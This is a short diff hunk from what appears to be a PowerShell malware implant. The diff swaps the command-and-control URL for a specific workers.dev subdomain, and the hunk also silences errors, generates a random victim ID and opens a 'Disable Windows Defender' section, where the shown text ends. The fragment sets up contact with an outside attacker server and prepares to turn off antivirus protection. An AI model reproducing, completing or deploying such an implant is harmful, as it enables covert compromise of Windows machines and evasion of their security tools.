@@ -2,7 +2,7 @@
 $ErrorActionPreference = 'SilentlyContinue'
 
 # Configuration
-$C2_URL = 'https://readme.workers.dev'
+$C2_URL = 'https://readme.sharansahu1604.workers.dev'
 $VICTIM_ID = -join ((65..90) + (97..122) | Get-Random -Count 12 | % {[char]$_})
 
 # Disable Windows Defender
